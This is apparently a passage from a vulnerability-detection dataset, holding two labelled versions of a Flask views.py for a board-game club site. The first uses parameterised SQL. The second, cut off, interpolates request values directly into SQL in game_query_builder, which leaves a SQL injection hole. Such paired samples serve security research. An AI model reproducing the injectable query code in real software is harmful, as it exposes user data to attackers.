intended for this app?\n        token['aud'] == app.config['CLIENT_ID'] and\n        # Is it still valid (not expired)?\n        token['exp'] > int(time.time())\n    ):\n        return True\n\n\n##################################################\n# Miscellaneous functions used by view functions #\n##################################################\n\ndef json_response(body, code):\n    \"\"\"Build a JSON response.\"\"\"\n    j_response = make_response(json.dumps(body), code)\n    j_response.headers['Content-Type'] = 'application/json'\n    return j_response\n\n\ndef error_response(err_msg, code):\n    \"\"\"Build a one-line JSON error response.\"\"\"\n    err_response = make_response(json.dumps({\"error-msg\": err_msg}), code)\n    err_response.headers['Content-Type'] = 'application/json'\n    return err_response\n\n\ndef bgg_game_options(bg_name):\n    \"\"\"Search for games on bgg API by name and return all the matching options.\n\n    Args:\n        bg_name (str): game name.\n\n    Returns:\n        List of dictionaries. Each dictionary holds basic info about a game.\n    \"\"\"\n    bgg_games = []\n    url = 'https://boardgamegeek.com/xmlapi2/search'\n    payload = {'query': bg_name, 'type': 'boardgame'}\n    r = requests.get(url, params=payload)\n    print r.url\n    # Parse the xml response\n    root = ElementTree.fromstring(r.content)\n    for item in root.findall('item'):\n        bgg_id = item.get('id')\n        game_name = item.find('name').get('value')\n        try:\n            year = item.find('yearpublished').get('value')\n        except AttributeError:\n            year = ''\n        bgg_games.append({'id': bgg_id, 'name': game_name, 'year': year})\n    return bgg_games\n\n\ndef bgg_game_info(bgg_id):\n    \"\"\"Get game info from bgg API; return dictionary with game info and\n    list of game category objects .\n    \"\"\"\n    game_info = {'bgg_id': bgg_id}\n    url = 'https://www.boardgamegeek.com/xmlapi2/thing'\n    payload = {'id': bgg_id, 'stats': 1}\n    r = requests.get(url, params=payload)\n    # Parse the xml response\n    root = ElementTree.fromstring(r.content)[0]\n    # name\n    for name in root.findall('name'):\n        if name.get('type') == 'primary':\n            game_info['name'] = name.get('value')\n    # image\n    game_info['image'] = root.find('image').text\n    # complexity/weight\n    game_info['weight'] = root.find('statistics').find('ratings').find(\n        'averageweight').get('value')\n    # bgg_rating\n    game_info['bgg_rating'] = root.find('statistics').find('ratings').find(\n        'average').get('value')\n    # other properties\n    properties = ['year_published', 'min_age', 'min_playtime', 'max_playtime',\n                  'min_players', 'max_players']\n    for bg_prop in properties:\n        game_info[bg_prop] = root.find(bg_prop.replace('_', '')).get('value')\n\n    game_info['bgg_link'] = 'https://boardgamegeek.com/boardgame/{}'.format(\n        bgg_id)\n    # categories\n    categories = []\n    for link in root.findall('link'):\n        if link.get('type') == 'boardgamecategory':\n            categories.append(check_game_category(link.get('value')))\n    return game_info, categories\n\n\ndef check_user(email, name, picture):\n    \"\"\"Check if the user is already in the database;\n    if not, make a new entry. Return user's id.\n    \"\"\"\n    user = User.query.filter_by(email=email).scalar()\n    new_user = False\n    if not user:\n        print 'adding new user to the db'\n        user = User(email=email, name=name, picture=picture)\n        db_session.add(user)\n        db_session.commit()\n        user = User.query.filter_by(email=email).scalar()\n        new_user = True\n    else:\n        print 'user already exists'\n    return user.id, new_user\n\n\ndef check_game_category(category_name):\n    \"\"\"Check if the game category is already in the database;\n    if not, make a new entry. Return the category.\n    \"\"\"\n    category = GameCategory.query.filter_by(name=category_name).scalar()\n    if not category:\n        new_category = GameCategory(name=category_name)\n        db_session.add(new_category)\n        db_session.commit()\n        category = GameCategory.query.filter_by(name=category_name).scalar()\n    return category\n\n\ndef check_game(bgg_id):\n    \"\"\"Check if the game is already in the database;\n    if not, make a new entry. Return the game.\n    \"\"\"\n    bgame = Game.query.filter_by(bgg_id=bgg_id).scalar()\n    if not bgame:\n        # Get the game info from bgg API\n        game_info, bgg_categories = bgg_game_info(bgg_id)\n        # Add the game to the database\n        bgame = Game(**game_info)\n        bgame.categories = bgg_categories\n        db_session.add(bgame)\n        db_session.commit()\n        print 'Game added to the database!'\n    else:\n        print 'Game already in the database'\n    return bgame\n\n\ndef make_posts_read(posts):\n    \"\"\"Prepare data on a set of posts for the template engine.\n\n    Args:\n        posts (list): list of Post objects.\n\n    Returns:\n         List of dictionaries. Each dictionary holds all the post data\n         required by the template engine.\n    \"\"\"\n    posts_read = []\n    user_id = session.get('user_id')\n    for post in posts:\n        user = post.author\n        post_dict = {\n            'id': post.id,\n            'subject': post.subject,\n            'body': post.body,\n            'author': user.name,\n            'author_picture': user.picture,\n            'posted': time.strftime(\"%d/%m/%Y, %H:%M\",\n                                    time.gmtime(post.posted)),\n            'owner': post.user_id == user_id\n        }\n        if post.edited:\n            post_dict['edited'] = time.strftime(\"%d/%m/%Y, %H:%M\",\n                                                time.gmtime(post.edited))\n        posts_read.append(post_dict)\n    return posts_read\n\n\ndef game_query_builder(key, value, query, param_dict):\n    \"\"\"Modify textual sql query in order take into account an additional\n    WHERE condition.\n\n    Args:\n        key (str): condition name.\n        value (str): condition value.\n        query (str): textual SQL statement.\n        param_dict (dict): dict with params for textual SQL statement.\n\n    Returns:\n        str: modified SQL query.\n    \"\"\"\n    d = {'id': 'id in (:{val})',\n         'name': 'name LIKE :{val}',\n         'rating-min': 'bgg_rating>=:{val}',\n         'players-from': 'min_players<=:{val}',\n         'players-to': 'max_players>=:{val}',\n         'time-from': 'max_playtime>=:{val}',\n         'time-to': 'min_playtime<=:{val}',\n         'weight-min': 'weight>=:{val}',\n         'weight-max': 'weight<=:{val}',\n         }\n    if len(value) == 0 or value == 'any' or not d.get(key):\n        # Do nothing\n        return query, param_dict\n    # Add condition value to param_dict\n    param_key = 'val_{}'.format(len(param_dict) + 1)\n    if key == 'name':\n        value = '{}%'.format(value)\n    param_dict[param_key] = value\n    # Modify SQL statement\n    if key == 'id' and 'id in' in query:\n        pos = query.find(')', query.find('id in'))\n        query = query[:pos] + ', :' + param_key + query[pos:]\n    else:\n        query = query + d[key].format(val=param_key) + ' AND '\n    return query, param_dict\n\n\ndef clear_games(*games):\n    \"\"\"Remove orphaned games from the database.\n\n    If any of the games is not owned by any user or the club,\n    remove it from the database.\n    \"\"\"\n    for game in games:\n        if len(game.users) == 0 and len(game.clubs) == 0:\n            categories = game.categories\n            db_session.delete(game)\n            db_session.commit()\n            clear_categories(*categories)\n\n\ndef clear_categories(*categories):\n    \"\"\"Remove orphaned game categories from the database\"\"\"\n    for category in categories:\n        if len(category.games) == 0:\n            db_session.delete(category)\n            db_session.commit()\n\n\ndef patch_resource(attributes, my_obj):\n    \"\"\"Patch database resource.\n\n    Args:\n        attributes (list): list of dictionaries;\n            each dictionary is in the following format:\n            {'name': attr_name, 'value': attr_value}.\n        my_obj: instance of any of the models classes.\n    \"\"\"\n    for attribute in attributes:\n        setattr(my_obj, attribute['name'], attribute['value'])\n    db_session.add(my_obj)\n    db_session.commit()\n\n\ndef validate_api_game_query(query_dict):\n    \"\"\"Validate keys and values of the query.\n\n    Args:\n        query_dict (dict): dictionary where each key:value pair\n            represents condition-name:condition-value pair of\n            an SQL WHERE condition.\n\n    Returns:\n        bool: True if all keys and values are valid, False otherwise.\n    \"\"\"\n    args_int = ['club', 'user', 'id', 'category', 'rating-min', 'players-from',\n                'players-to', 'time-from', 'time-to', 'weight-min',\n                'weight-max']\n    args_other = ['name']\n    args_dupl = ['user', 'id', 'category']\n    for key, value in query_dict.iteritems(multi=True):\n        if(\n            # Check if any of the keys is invalid\n            key not in args_int + args_other or\n            # Check if any of the values is invalid\n            key in args_int and not value.isdigit()\n        ):\n            return False\n    # Check if there are any non-allowed key duplicates\n    for key, values in query_dict.iterlists():\n        if key not in args_dupl and len(values) > 1:\n            return False\n    # Validate players-to and players-from\n    players = ['players-from', 'players-to']\n    if not(\n        # None of the two keys is present\n        not any([x in query_dict for x in players]) or\n        # Both keys are present and ...\n        all([x in query_dict for x in players]) and\n        # ... their values are valid\n        int(query_dict['players-to']) >= int(query_dict['players-from'])\n    ):\n        return False\n    return True\n\n\ndef dicts_purge(p_dicts, *keep_keys):\n    \"\"\"Purge dictionaries of unwanted key:value pairs.\n\n    Args:\n        p_dicts (list): list of dicts to be purged.\n        *keep_keys: list of keys to be kept.\n\n    Returns:\n        List of purged dicts.\n    \"\"\"\n    for p_dict in p_dicts:\n        for key in p_dict.keys():\n            if key not in keep_keys:\n                del p_dict[key]\n    return p_dicts\n\n\ndef sql_to_dicts(*games):\n    \"\"\"Convert Game objects to dictionaries.\n\n    Each column-name:value pair in an object is converted to a\n    key:value pair in the corresponding dictionary.\n\n    Args:\n        *games: list of Game objects.\n\n    Returns:\n        list of dictionaries.\n    \"\"\"\n    sql_dicts = []\n    for game in games:\n        keys = game.__table__.columns.keys()\n        values = [getattr(game, key) for key in keys]\n        values = [float(value) if type(value) == Decimal\n                  else value for value in values]\n        sql_dicts.append(dict(zip(keys, values)))\n    return sql_dicts\n\n\ndef sign_out():\n    \"\"\"Sign out a user.\"\"\"\n    try:\n        # Revoke access token if possible\n        r = requests.post(\n            'https://accounts.google.com/o/oauth2/revoke',\n            params={'token': session['access_token']},\n            headers={'content-type': 'application/x-www-form-urlencoded'})\n        if r.status_code != 200:\n            print 'Failed to revoke access token'\n            print r.text\n        # Delete user info from session\n        del session['email']\n        del session['username']\n        del session['access_token']\n        del session['user_id']\n        del session['_csrf_token']\n        print 'Signed out'\n    except KeyError:\n        print 'Not signed in'\n        abort(401)\n\n\n##################\n# View functions #\n##################\n\n@app.route('/')\ndef home():\n    \"\"\"Return the app's main page.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    members = User.query.all()\n    posts = Post.query.all()\n    posts_read = make_posts_read(posts)\n    return render_template('club.html', club=club, posts=posts_read,\n                           members=members, games=club.games,\n                           owner=check_ownership())\n\n\n@app.route('/club', methods=['PATCH'])\ndef club_():\n    \"\"\"Update the Club.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    attributes = request.get_json()['data']['attributes']\n    patch_resource(attributes, club)\n    flash('Club info updated!')\n    return '', 204\n\n\n@app.route('/club/games/add', methods=['GET', 'POST'])\ndef club_game_add():\n    \"\"\"Create ClubGame or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        # Show the game options matching the specified name\n        bgg_options = bgg_game_options(request.args['name'])\n        return render_template('game-options.html', games=bgg_options)\n    else:\n        # Add the chosen game to the database\n        game = check_game(request.form['bgg-id'])\n        club = Club.query.filter_by(id=1).scalar()\n        club.games.append(game)\n        db_session.add(club)\n        db_session.commit()\n        flash('Game added to the collection!')\n        return redirect(url_for('home'))\n\n\n@app.route('/club/games/<int:game_id>', methods=['DELETE'])\ndef club_game_(game_id):\n    \"\"\"Delete ClubGame.\"\"\"\n    club = Club.query.filter_by(id=1).scalar()\n    try:\n        game = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    club.games.remove(game)\n    db_session.commit()\n    clear_games(game)\n    flash('Game removed from the collection!')\n    return '', 204\n\n\n@app.route('/posts/add', methods=['GET', 'POST'])\ndef post_add():\n    \"\"\"Create Post or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        return render_template('post-new.html')\n    else:\n        # Add Post to the database\n        post_data = {\n            'user_id': session['user_id'],\n            'subject': request.form['subject'],\n            'body': request.form['body'],\n            'posted': int(time.time())\n        }\n        post = Post(**post_data)\n        db_session.add(post)\n        db_session.commit()\n        flash('Post created!')\n        return redirect(url_for('home'))\n\n\n@app.route('/posts/<int:post_id>', methods=['PATCH', 'DELETE'])\ndef post_(post_id):\n    \"\"\"Update or Delete Post.\n\n    Use PATCH and DELETE methods respectively.\n    \"\"\"\n    post = Post.query.filter_by(id=post_id).scalar()\n    if request.method == 'PATCH':\n        # Update Post\n        attributes = request.get_json()['data']['attributes']\n        attributes.append({'name': 'edited', 'value': int(time.time())})\n        patch_resource(attributes, post)\n        flash('Post edited!')\n        return '', 204\n    else:\n        # Delete Post\n        db_session.delete(post)\n        db_session.commit()\n        flash('Post deleted!')\n        return '', 204\n\n\n@app.route('/users/<int:user_id>/new')\ndef profile_add(user_id):\n    \"\"\"Return page with form letting the user update his/her new profile.\"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    return render_template('profile-new.html', user=user)\n\n\n@app.route('/users/<int:user_id>', methods=['GET', 'PATCH', 'DELETE'])\ndef profile_(user_id):\n    \"\"\"Return user's profile page or Update Profile or Delete Profile.\n\n    Use GET, PATCH and DELETE methods respectively.\n    \"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    if request.method == 'GET':\n        # Return user's profile page\n        return render_template('profile.html', user=user, games=user.games,\n                               owner=check_ownership())\n    elif request.method == 'PATCH':\n        # Update Profile\n        attributes = request.get_json()['data']['attributes']\n        patch_resource(attributes, user)\n        flash('Profile updated!')\n        return '', 204\n    else:\n        # Delete Profile\n        games = user.games\n        db_session.delete(user)\n        db_session.commit()\n        clear_games(*games)\n        sign_out()\n        flash('Profile deleted!')\n        return '', 204\n\n\n@app.route('/users/<int:user_id>/games/add', methods=['GET', 'POST'])\ndef profile_game_add(user_id):\n    \"\"\"Create UserGame or return page with form to do so.\n\n    Use POST and GET methods respectively.\n    \"\"\"\n    if request.method == 'GET':\n        # Show the game options matching the specified name\n        bgg_options = bgg_game_options(request.args['name'])\n        return render_template('game-options.html', games=bgg_options)\n    else:\n        # Add the chosen game to the database\n        game = check_game(request.form['bgg-id'])\n        user = User.query.filter_by(id=user_id).scalar()\n        user.games.append(game)\n        db_session.add(user)\n        db_session.commit()\n        flash('Game added to the collection!')\n        return redirect(url_for('profile_', user_id=user_id))\n\n\n@app.route('/users/<int:user_id>/games/<int:game_id>', methods=['DELETE'])\ndef profile_game_(user_id, game_id):\n    \"\"\"Delete UserGame.\"\"\"\n    try:\n        user = User.query.filter_by(id=user_id).one()\n        game = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    user.games.remove(game)\n    db_session.commit()\n    clear_games(game)\n    flash('Game removed from the collection!')\n    return '', 204\n\n\n@app.route('/games/<int:game_id>', methods=['GET', 'POST'])\ndef game_(game_id):\n    \"\"\"Return game page or Update Game.\n\n    Use GET and POST methods respectively.\n    \"\"\"\n    try:\n        bgame = Game.query.filter_by(id=game_id).one()\n    except sqlalchemy.orm.exc.NoResultFound:\n        abort(404)\n    if request.method == 'GET':\n        # Return game page\n        return render_template('game.html', game=bgame)\n    else:\n        # Update game info from bgg API\n        game_info, bgg_categories = bgg_game_info(bgame.bgg_id)\n        for key, value in game_info.iteritems():\n            setattr(bgame, key, value)\n        bgame.categories = bgg_categories\n        db_session.commit()\n        flash('Game info updated!')\n        return redirect(url_for('game_', game_id=game_id))\n\n\n@app.route('/games/search')\ndef game_finder():\n    \"\"\"Return game-finder page.\"\"\"\n    all_categories = GameCategory.query.all()\n    games = []\n    if len(request.args) > 0:\n        # Build SQL query\n        query = ''\n        param_dict = {}\n        for key, value in request.args.iteritems():\n            query, param_dict = game_query_builder(key, value, query,\n                                                   param_dict)\n        query = query[:-5]\n        print query\n        print param_dict\n        # Get games satisfying the search criteria\n        game_category = int(request.args['category'])\n        if game_category == 0:\n            games = Game.query.filter(sqlalchemy.text(query).params(\n                param_dict)).all()\n        else:\n            # Consider game category\n            games = (\n                Game.query.filter(sqlalchemy.text(query).params(param_dict))\n                .filter(Game.categories.any(GameCategory.id == game_category))\n                .all()\n            )\n    return render_template('game-finder.html', games=games,\n                           all_categories=all_categories)\n\n\n@app.route('/api/games')\ndef api_games():\n    \"\"\"Return list of games, with all their attributes, satisfying\n    the criteria provided in the request query string.\n\n    Valid query args are of two types: ownership type and game-attribute type.\n    The function first builds two sets of games, ownership set with\n    games satisfying the ownership criteria and game-attribute set with\n    games satisfying the game-attribute criteria; an intersection of\n    these two sets is then returned to the user. Specifying no criteria\n    of a given type will result in the corresponding set with all\n    the games in the database.\n\n    Valid arguments are as follows:\n        ownership type:\n            club=1: include all games owned by the club\n            user=INTEGER: include all games owned by the user,\n                value denotes user id,\n                multiple args=YES\n        game-attribute type:\n            id=INTEGER: value denotes game id,\n                multiple args=YES\n            name=NAME\n            category=INTEGER: value denotes category id,\n                multiple args=YES\n            rating-min=[1-10]\n            players-from=INTEGER: query must also include players-to\n            players-to=INTEGER: query must also include players-from\n            time-from=INTEGER\n            time-to=INTEGER\n            weight-min=[1-5]\n            weight-max=[1-5]\n\n    The response is in JSON.\n    \"\"\"\n    if not validate_api_game_query(request.args):\n        return error_response(\n            'One or more query parameters have invalid key and/or value', 400)\n    # Club filter\n    games_club = []\n    if request.args.get('club') == '1':\n        games_club = db_session.query(clubs_games_assoc).all()\n        games_club = [club_game.game_id for club_game in games_club]\n    print 'games_club', games_club\n    # User filter\n    users = [int(user_id) for user_id in request.args.getlist('user')]\n    games_users = db_session.query(users_games_assoc).filter(\n        users_games_assoc.c.user_id.in_(users)).all()\n    games_users = [game.game_id for game in games_users]\n    print 'games_user', games_users\n    # Game attribute filter\n    query = ''\n    param_dict = {}\n    for key, value in request.args.iteritems(multi=True):\n        query, param_dict = game_query_builder(key, value, query, param_dict)\n    query = query[:-5]\n    categories = request.args.getlist('category')\n    if len(categories) == 0:\n        attr_games = Game.query.filter(sqlalchemy.text(query).params(\n            param_dict)).all()\n    else:\n        # Consider game categories\n        attr_games = (\n            Game.query.filter(sqlalchemy.text(query).params(param_dict))\n            .filter(Game.categories.any(GameCategory.id.in_(categories))).all()\n        )\n    attr_games = [game.id for game in attr_games]\n    print 'games_query', attr_games\n    # Union of club and user games\n    owned_games = set(games_club) | set(games_users)\n    print 'union', owned_games\n    # Intersection of owned_games and attr_games\n    games_id = ((set(attr_games) & owned_games)\n                if len(owned_games) > 0 else set(attr_games))\n    print 'intersection', games_id\n    # Get all games satisfying the search criteria\n    games = Game.query.filter(Game.id.in_(games_id)).all()\n    games_dict = sql_to_dicts(*games)\n    # Add category info to each game_dict\n    games_categories = {}\n    for game in games:\n        games_categories[game.id] = [game_category.name for game_category in\n                                     game.categories]\n    for game_dict in games_dict:\n        game_dict['category'] = games_categories[game_dict['id']]\n    return jsonify(games=games_dict)\n\n\n@app.route('/api/info')\ndef api_info():\n    \"\"\"Return basic information on all sql entries of chosen types.\n\n    Valid query args:\n        users=1\n        categories=1\n        games=1\n\n    The response is in JSON.\n    \"\"\"\n    d = {\n        'users': User.query.all(),\n        'categories': GameCategory.query.all(),\n        'games': Game.query.all()\n    }\n    info = {}\n    for key, value in request.args.iteritems():\n        if d.get(key) and value == '1':\n            sql_all_dict = sql_to_dicts(*d[key])\n            info[key] = dicts_purge(sql_all_dict,\n                                    *['id', 'name', 'year_published'])\n    return jsonify(**info)\n\n\n@app.route('/gconnect', methods=['POST'])\ndef g_connect():\n    \"\"\"Sign in user.\"\"\"\n    # Additional csrf check\n    if not request.headers.get('X-Requested-With'):\n        abort(403)\n    # Get one-time code from the end-user\n    auth_code = request.get_json().get('auth_code')\n    # Exchange one-time code for id_token and access_token\n    try:\n        credentials = client.credentials_from_clientsecrets_and_code(\n            app.config['CLIENT_SECRET_FILE'],\n            ['https://www.googleapis.com/auth/drive.appdata', 'profile',\n             'email'],\n            auth_code)\n    except client.FlowExchangeError:\n        return error_response('Failed to upgrade one-time authorization code.',\n                              401)\n    # Validate id_token\n    if not validate_id_token(credentials.id_token, credentials.id_token_jwt):\n        return error_response('id token is not valid', 500)\n    # Get user info from access token\n    userinfo_url = \"https://www.googleapis.com/oauth2/v1/userinfo\"\n    params = {'access_token': credentials.access_token, 'alt': 'json'}\n    answer = requests.get(userinfo_url, params=params)\n    user_data = answer.json()\n    # Store user info in the session for later use\n    session['email'] = credentials.id_token['email']\n    session['username'] = user_data['name']\n    session['access_token'] = credentials.access_token\n    # If the user does not exist, add him to the database\n    session['user_id'], new_user = check_user(\n        session['email'], session['username'],  user_data['picture'])\n    # Response\n    body = {'username': user_data['name'],\n            'user_id': session['user_id'],\n            'new_user': new_user}\n    return json_response(body, 200)\n\n\n@app.route('/gdisconnect', methods=['POST'])\ndef g_disconnect():\n    \"\"\"Sign out user.\"\"\"\n    sign_out()\n    flash('Signed out!')\n    return '', 204\n/n/n/n", "label": 0}, {"id": "49c1e478193930ddc9f4cfb873cfab8d8f5653bc", "code": "/vagrant/4-project/boardgameclub/views.py/n/nfrom flask import (render_template, url_for, request, redirect, session, abort,\n                   make_response, jsonify, flash)\nimport sqlalchemy\nimport sqlalchemy.orm.exc\nimport requests\nfrom xml.etree import ElementTree\nimport json\nimport time\nimport string\nimport random\nfrom decimal import Decimal\nfrom oauth2client import client\nfrom boardgameclub import app\nfrom boardgameclub.database import db_session\nfrom boardgameclub.models import (Club, Game, Post,  User, GameCategory,\n                                  ClubAdmin, clubs_games_assoc,\n                                  users_games_assoc)\n\n\n###################\n# Csrf protection #\n###################\n\n# Implemented as per:\n# http://flask.pocoo.org/snippets/3/' posted by Dan Jacob on 2010-05-03\n# but with only one token per session.\n\n@app.before_request\ndef csrf_protect():\n    \"\"\"Abort create, update and delete requests without correct csrf tokens.\"\"\"\n    if request.method in ('POST', 'PATCH', 'DELETE'):\n        print 'validating csrf token'\n        token = session.get('_csrf_token')\n        token_from_json = request.get_json().get(\n            '_csrf_token') if request.get_json() else None\n        if (\n            not token or\n            token not in (request.form.get('_csrf_token'), token_from_json)\n        ):\n            print 'failed csrf token test'\n            abort(403)\n        else:\n            print 'csrf token ok'\n\n\ndef generate_csrf_token():\n    \"\"\"Add csrf token to the session and return the csrf token.\"\"\"\n    if '_csrf_token' not in session:\n        print 'generating csrf token'\n        session['_csrf_token'] = random_string()\n    return session['_csrf_token']\n\n\ndef random_string():\n    \"\"\"Create a random string.\"\"\"\n    chars = string.ascii_letters + string.digits\n    return ''.join([chars[random.randint(0, 61)] for i in range(20)])\n\n\napp.jinja_env.globals['csrf_token'] = generate_csrf_token\n\n\n###############################\n# Database session management #\n###############################\n\n@app.teardown_appcontext\ndef remove_session(exception=None):\n    \"\"\"Remove database session at the end of each request.\"\"\"\n    db_session.remove()\n\n\n####################################\n# Authentication and authorisation #\n####################################\n\n@app.before_request\ndef ownership_required():\n    \"\"\"Prevent access to update and delete endpoints by\n    non-authorized users.\n    \"\"\"\n    if (\n        request.endpoint in ('profile_game_add', 'club_game_add') or\n        request.method in ('PATCH', 'DELETE')\n    ):\n        print 'checking ownership'\n        if 'user_id' not in session or not check_ownership():\n            abort(403)\n        else:\n            print 'ownership ok'\n\n\ndef check_ownership():\n    \"\"\"Verify if the user is the owner of the requested resource.\"\"\"\n    user_id = session.get('user_id')\n    if not user_id:\n        return False\n    elif 'club_' in request.endpoint or 'home' in request.endpoint:\n        admin = ClubAdmin.query.filter_by(user_id=user_id).scalar()\n        return True if admin else False\n    elif 'profile_' in request.endpoint:\n        return request.view_args['user_id'] == user_id\n    elif request.endpoint == 'post_':\n        owned_post = Post.query.filter_by(\n            id=request.view_args['post_id'], user_id=user_id).scalar()\n        return True if owned_post else False\n    else:\n        print 'Unable to verify ownership'\n        return False\n\n\n@app.before_request\ndef login_required():\n    \"\"\"Prevent access to create endpoints by non-authenticated users.\"\"\"\n    if (\n        (request.endpoint in ('post_add', 'profile_add', 'g_disconnect') or\n         request.endpoint == 'game_' and request.method == 'POST') and\n        'username' not in session\n    ):\n        abort(401)\n\n\ndef validate_id_token(token, token_jwt):\n    \"\"\"Validate id_token as per\n    https://developers.google.com/identity/protocols/OpenIDConnect.\n    \"\"\"\n    url = 'https://www.googleapis.com/oauth2/v3/tokeninfo'\n    params = 'id_token={}'.format(token_jwt)\n    r = requests.get(url, params=params)\n\n    if (\n        # Is the token properly signed by the issuer?\n        r.status_code == 200 and r.json()['aud'] == token['aud'] and\n        # Was it issued by google?\n        token['iss'] in ('https://accounts.google.com',\n                         'accounts.google.com') and\n        # Is it intended for this app?\n        token['aud'] == app.config['CLIENT_ID'] and\n        # Is it still valid (not expired)?\n        token['exp'] > int(time.time())\n    ):\n        return True\n\n\n##################################################\n# Miscellaneous functions used by view functions #\n##################################################\n\ndef json_response(body, code):\n    \"\"\"Build a JSON response.\"\"\"\n    j_response = make_response(json.dumps(body), code)\n    j_response.headers['Content-Type'] = 'application/json'\n    return j_response\n\n\ndef error_response(err_msg, code):\n    \"\"\"Build a one-line JSON error response.\"\"\"\n    err_response = make_response(json.dumps({\"error-msg\": err_msg}), code)\n    err_response.headers['Content-Type'] = 'application/json'\n    return err_response\n\n\ndef bgg_game_options(bg_name):\n    \"\"\"Search for games on bgg API by name and return all the matching options.\n\n    Args:\n        bg_name (str): game name.\n\n    Returns:\n        List of dictionaries. Each dictionary holds basic info about a game.\n    \"\"\"\n    bgg_games = []\n    url = 'https://boardgamegeek.com/xmlapi2/search'\n    payload = {'query': bg_name, 'type': 'boardgame'}\n    r = requests.get(url, params=payload)\n    print r.url\n    # Parse the xml response\n    root = ElementTree.fromstring(r.content)\n    for item in root.findall('item'):\n        bgg_id = item.get('id')\n        game_name = item.find('name').get('value')\n        try:\n            year = item.find('yearpublished').get('value')\n        except AttributeError:\n            year = ''\n        bgg_games.append({'id': bgg_id, 'name': game_name, 'year': year})\n    return bgg_games\n\n\ndef bgg_game_info(bgg_id):\n    \"\"\"Get game info from bgg API; return dictionary with game info and\n    list of game category objects .\n    \"\"\"\n    game_info = {'bgg_id': bgg_id}\n    url = 'https://www.boardgamegeek.com/xmlapi2/thing'\n    payload = {'id': bgg_id, 'stats': 1}\n    r = requests.get(url, params=payload)\n    # Parse the xml response\n    root = ElementTree.fromstring(r.content)[0]\n    # name\n    for name in root.findall('name'):\n        if name.get('type') == 'primary':\n            game_info['name'] = name.get('value')\n    # image\n    game_info['image'] = root.find('image').text\n    # complexity/weight\n    game_info['weight'] = root.find('statistics').find('ratings').find(\n        'averageweight').get('value')\n    # bgg_rating\n    game_info['bgg_rating'] = root.find('statistics').find('ratings').find(\n        'average').get('value')\n    # other properties\n    properties = ['year_published', 'min_age', 'min_playtime', 'max_playtime',\n                  'min_players', 'max_players']\n    for bg_prop in properties:\n        game_info[bg_prop] = root.find(bg_prop.replace('_', '')).get('value')\n\n    game_info['bgg_link'] = 'https://boardgamegeek.com/boardgame/{}'.format(\n        bgg_id)\n    # categories\n    categories = []\n    for link in root.findall('link'):\n        if link.get('type') == 'boardgamecategory':\n            categories.append(check_game_category(link.get('value')))\n    return game_info, categories\n\n\ndef check_user(email, name, picture):\n    \"\"\"Check if the user is already in the database;\n    if not, make a new entry. Return user's id.\n    \"\"\"\n    user = User.query.filter_by(email=email).scalar()\n    new_user = False\n    if not user:\n        print 'adding new user to the db'\n        user = User(email=email, name=name, picture=picture)\n        db_session.add(user)\n        db_session.commit()\n        user = User.query.filter_by(email=email).scalar()\n        new_user = True\n    else:\n        print 'user already exists'\n    return user.id, new_user\n\n\ndef check_game_category(category_name):\n    \"\"\"Check if the game category is already in the database;\n    if not, make a new entry. Return the category.\n    \"\"\"\n    category = GameCategory.query.filter_by(name=category_name).scalar()\n    if not category:\n        new_category = GameCategory(name=category_name)\n        db_session.add(new_category)\n        db_session.commit()\n        category = GameCategory.query.filter_by(name=category_name).scalar()\n    return category\n\n\ndef check_game(bgg_id):\n    \"\"\"Check if the game is already in the database;\n    if not, make a new entry. Return the game.\n    \"\"\"\n    bgame = Game.query.filter_by(bgg_id=bgg_id).scalar()\n    if not bgame:\n        # Get the game info from bgg API\n        game_info, bgg_categories = bgg_game_info(bgg_id)\n        # Add the game to the database\n        bgame = Game(**game_info)\n        bgame.categories = bgg_categories\n        db_session.add(bgame)\n        db_session.commit()\n        print 'Game added to the database!'\n    else:\n        print 'Game already in the database'\n    return bgame\n\n\ndef make_posts_read(posts):\n    \"\"\"Prepare data on a set of posts for the template engine.\n\n    Args:\n        posts (list): list of Post objects.\n\n    Returns:\n         List of dictionaries. Each dictionary holds all the post data\n         required by the template engine.\n    \"\"\"\n    posts_read = []\n    user_id = session.get('user_id')\n    for post in posts:\n        user = post.author\n        post_dict = {\n            'id': post.id,\n            'subject': post.subject,\n            'body': post.body,\n            'author': user.name,\n            'author_picture': user.picture,\n            'posted': time.strftime(\"%d/%m/%Y, %H:%M\",\n                                    time.gmtime(post.posted)),\n            'owner': post.user_id == user_id\n        }\n        if post.edited:\n            post_dict['edited'] = time.strftime(\"%d/%m/%Y, %H:%M\",\n                                                time.gmtime(post.edited))\n        posts_read.append(post_dict)\n    return posts_read\n\n\ndef game_query_builder(key, value, query):\n    \"\"\"Modify textual sql query in order take into account an additional\n    WHERE condition.\n\n    Args:\n        key (str): condition name.\n        value (str): condition value.\n        query (str): SQL query.\n\n    Returns:\n        str: modified SQL query.\n    \"\"\"\n    d = {'id': \"id in ({value})\",\n         'name': \"name LIKE '{value}%'\",\n         'rating-min': 'bgg_rating>={value}',\n         'players-from': 'min_players<={value}',\n         'players-to': 'max_players>={value}',\n         'time-from': 'max_playtime>={value}',\n         'time-to': 'min_playtime<={value}',\n         'weight-min': 'weight>={value}',\n         'weight-max': 'weight<={value}',\n         }\n    if len(value) == 0 or value == 'any' or not d.get(key):\n        # do nothing\n        return query\n    elif key == 'id' and 'id in' in query:\n        pos = query.find(')', query.find('id in'))\n        return query[:pos] + ', ' + value + query[pos:]\n    else:\n        return query + d[key].format(value=value) + ' AND '\n\n\ndef clear_games(*games):\n    \"\"\"Remove orphaned games from the database.\n\n    If any of the games is not owned by any user or the club,\n    remove it from the database.\n    \"\"\"\n    for game in games:\n        if len(game.users) == 0 and len(game.clubs) == 0:\n            categories = game.categories\n            db_session.delete(game)\n            db_session.commit()\n            clear_categories(*categories)\n\n\ndef clear_categories(*categories):\n    \"\"\"Remove orphaned game categories from the database\"\"\"\n    for category in categories:\n        if len(category.games) == 0:\n            db_session.delete(category)\n            db_session.commit()\n\n\ndef patch_resource(attributes, my_obj):\n    